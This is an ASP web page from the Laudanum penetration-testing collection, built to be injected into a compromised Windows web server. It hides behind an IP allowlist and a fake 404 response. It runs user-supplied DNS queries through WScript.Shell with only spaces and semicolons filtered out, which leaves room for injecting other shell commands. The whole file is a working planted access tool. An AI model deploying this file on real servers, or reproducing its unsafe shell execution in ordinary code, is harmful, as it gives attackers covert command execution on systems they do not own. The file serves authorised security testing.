<%
' *******************************************************************************
' ***
' *** Laudanum Project
' *** A Collection of Injectable Files used during a Penetration Test
' ***
' *** More information is available at:
' ***  http://laudanum.secureideas.net
' ***  laudanum@secureideas.net
' ***
' ***  Project Leads:
' ***         Kevin Johnson <kjohnson@secureideas.net
' ***         Tim Medin <tim@securitywhole.com>
' ***
' *** Copyright 2012 by Kevin Johnson and the Laudanum Team
' ***
' ********************************************************************************
' ***
' *** This file provides access to DNS on the system.
' *** Written by Tim Medin <timmedin@gmail.com>
' ***
' ********************************************************************************
' *** This program is free software; you can redistribute it and/or
' *** modify it under the terms of the GNU General Public License
' *** as published by the Free Software Foundation; either version 2
' *** of the License, or (at your option) any later version.
' ***
' *** This program is distributed in the hope that it will be useful,
' *** but WITHOUT ANY WARRANTY; without even the implied warranty of
' *** MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
' *** GNU General Public License for more details.
' ***
' *** You can get a copy of the GNU General Public License from this
' *** address: http://www.gnu.org/copyleft/gpl.html#SEC1
' *** You can also write to the Free Software Foundation, Inc., Temple
' *** Place - Suite  Boston, MA   USA.
' ***
' ***************************************************************************** */

' ***************** Config entries below ***********************

' IPs are enterable as individual addresses TODO: add CIDR support
Dim allowedIPs 
Dim allowed
Dim qtypes
Dim qtype
Dim validtype
Dim query
Dim i
Dim command

allowedIPs = "192.168.0.1,127.0.0.1"
' Just in cace you added a space in the line above
allowedIPs = replace(allowedIPS," ","")
'turn it into an array
allowedIPs = split(allowedIPS,",") '

' make sure the ip is allowed
allowed = 0
for i = lbound(allowedIPs) to ubound(allowedIPs)
	if allowedIPS(i) = Request.ServerVariables("REMOTE_ADDR") then
		allowed = 1
		Exit For
	end if
next
' send a 404 if not the allowed IP
if allowed = 0 then
	Response.Status = "404 File Not Found"
	Response.Write(Response.Status & Request.ServerVariables("REMOTE_ADDR"))
	Response.End
end if

%>
<html>
<head>
  <title>Laudanum ASP DNS Access</title>
  <link rel="stylesheet" href="style.css" type="text/css">
 
  <script type="text/javascript">
    function init() {
      document.dns.query.focus();
    }
  </script>
</head>
<body onload="init()">
 
<h1>DNS Query 0.1</h1>
<%

' dns query types as defined as by windows nslookup
qtypes = split ("ANY,A,AAAA,A+AAAA,CNAME,MX,NS,PTR,SOA,SRV",",")
qtype = UCase(Request.Form("type"))

' see if the query type is valid, if it isn't then set it.
validtype = 0
for i = lbound(qtypes) to ubound(qtypes)
	if qtype = qtypes(i) then
		validtype = 1
		Exit For
	end if 
next
if validtype = 0 then qtype = "ANY"

%>
<form name="dns" method="POST">
<fieldset>
  <legend>DNS Lookup:</legend>
  <p>Query:<input name="query" type="text">
  Type:<select name="type">
<%
for i = lbound(qtypes) to ubound(qtypes)
	if qtype = qtypes(i) then
		Response.Write("<option value=""" & qtypes(i) & """ SELECTED>" & qtypes(i) & "</option>")
	else
		
		Response.Write("<option value=""" & qtypes(i) & """>" & qtypes(i) & "</option>")
	end if
next
%>
  </select>
  <input type="submit" value="Submit">
</fieldset>
</form>
<%

' get the query
query = trim(Request.Form("query"))
' the query must be sanitized a bit to try to make sure the shell doesn't hang
query = replace(query, " ", "")
query = replace(query, ";", "")

if len(query) > 0 then
	command = "nslookup -type=" & qtype & " " & query 
	Set objWShell = Server.CreateObject("WScript.Shell")
	Set objCmd = objWShell.Exec(command)
	strPResult = objCmd.StdOut.Readall()
	set objCmd = nothing: Set objWShell = nothing
	%><pre><%
	Response.Write command & "<br>"
	Response.Write replace(strPResult,vbCrLf,"<br>")
	%></pre><%
end if
%>
 <hr/>
  <address>
  Copyright &copy; 2012, <a href="mailto:laudanum@secureideas.net">Kevin Johnson</a> and the Laudanum team.<br/>
  Written by Tim Medin.<br/>
  Get the latest version at <a href="http://laudanum.secureideas.net">laudanum.secureideas.net</a>.
  </address>

</body>
</html>

